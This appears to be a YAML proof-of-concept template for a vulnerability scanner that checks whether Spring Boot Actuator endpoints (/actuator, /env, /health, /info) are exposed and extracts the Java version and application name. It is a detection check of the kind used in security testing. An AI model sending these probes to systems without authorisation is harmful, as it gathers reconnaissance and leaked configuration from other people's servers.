name: poc-yaml-spring-boot-actuator-info-leak
transport: http
set:
  randomStr: randomLowercase(8)
  baseUrl: "/"
rules:
  r0:
    request:
      method: GET
      path: "{{baseUrl}}actuator"
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("_links") && response.body_string.contains("self")
  r1:
    request:
      method: GET
      path: "{{baseUrl}}actuator/env"
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("profiles") && response.body_string.contains("java")
    output:
      search: '"java\.version\":\"(?P<version>[^\"]+)".bsubmatch(response.body)'
      version: search["version"]
  r2:
    request:
      method: GET
      path: "{{baseUrl}}actuator/health"
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("status")
  r3:
    request:
      method: GET
      path: "{{baseUrl}}actuator/info"
      follow_redirects: true
    expression: |
      response.status == 200
    output:
      search: '"app\":\\{\"name\":\"(?P<name>[^\"]+)".bsubmatch(response.body)'
      appName: search["name"]
expression: r0() && (r1() || r2()) && r3()
detail:
  author: neutron-poc
  links:
    - https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
  description: Spring Boot Actuator 信息泄露漏洞
  vulnerability:
    id: spring-boot-actuator-info-leak
    level: medium
    match: "Java 版本: {{version}}, 应用名称: {{appName}}" 